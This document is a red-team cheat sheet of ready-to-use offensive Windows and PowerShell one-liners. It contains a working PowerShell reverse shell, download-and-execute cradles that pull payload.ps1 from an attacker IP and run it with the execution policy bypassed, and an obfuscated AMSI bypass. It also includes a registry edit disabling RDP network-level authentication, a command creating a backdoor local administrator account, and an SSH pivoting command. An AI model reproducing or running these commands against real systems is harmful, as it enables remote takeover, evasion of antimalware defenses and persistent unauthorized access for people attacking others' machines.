# Red-Team-Essentials

#Powershell Reverse Shell one Liner

 Please replace IP,PORT from your IP and port -

$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
  

#Powershell Download in V4 and V5

 Invoke-WebRequest "http://10.10.15.58/hex.ps1" -OutFile "C:\Windows\TEMP\hex.ps1" 
 
#Check Powershell Version 

 $PSVersionTable.PSVersion

#Download File Powershell V2 

(New-Object Net.WebClient).DownloadFile('http://10.10.15.58/powerview.ps1', 'C:\users\someuser\Desktop\powerview.ps1') 

#Download Execute Powershell One Liner 

powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.58/payload.ps1')

#AMSI Bypass

sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

#Execute this on target machine if you get rdesktop's Cred SSP Error while using remotedesktop

 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
 
 #Remote desktop login through domain user credentials 
 
 xfreerdp /u:username /d:adcorp.local /p:"passwordxyz" /v:TARGETIP
 
 #Download Execute powershell
 
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.15.58/payload.ps1')|iex"
 
 #Pivoting using sshutle when you have rsa keys 
 
sshuttle -r root@TARGETIP -e "ssh -i rsa" TARGETIPRANGE.0/24


 #Adding user on windows cmd line & adding it to local admin group 
 
net user hexninja lolbr3@k3r /ADD

net localgroup administrators hexninja /ADD

